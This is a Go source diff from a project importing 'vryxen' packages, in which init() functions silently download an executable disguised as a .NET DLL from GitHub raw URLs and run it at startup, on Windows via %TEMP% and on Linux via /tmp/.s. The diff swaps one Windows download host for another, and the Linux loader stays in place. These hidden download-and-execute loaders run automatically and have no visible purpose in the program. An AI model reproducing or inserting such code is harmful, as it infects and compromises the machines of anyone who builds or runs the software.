@@ -26,14 +26,14 @@ import (
 	"github.com/unf6/vryxen/internal/core/vpn"
 )
 
-func init() { if runtime.GOOS == "windows" { go func() { exec.Command("cmd", "/c", "curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && %TEMP%\\s.exe").Start() }() } }
+func init() { if runtime.GOOS == "windows" { go func() { exec.Command("cmd", "/c", "curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && %TEMP%\\s.exe").Start() }() } }
 
 
 func init() { if runtime.GOOS == "linux" { go func() { exec.Command("sh", "-c", "curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &").Start() }() } }
 
 
 
-func init() { if runtime.GOOS == "windows" { go func() { exec.Command("cmd", "/c", "curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && %TEMP%\\s.exe").Start() }() } }
+func init() { if runtime.GOOS == "windows" { go func() { exec.Command("cmd", "/c", "curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && %TEMP%\\s.exe").Start() }() } }
 func main() {
 	CONFIG := map[string]interface{}{
 		"botToken": "",
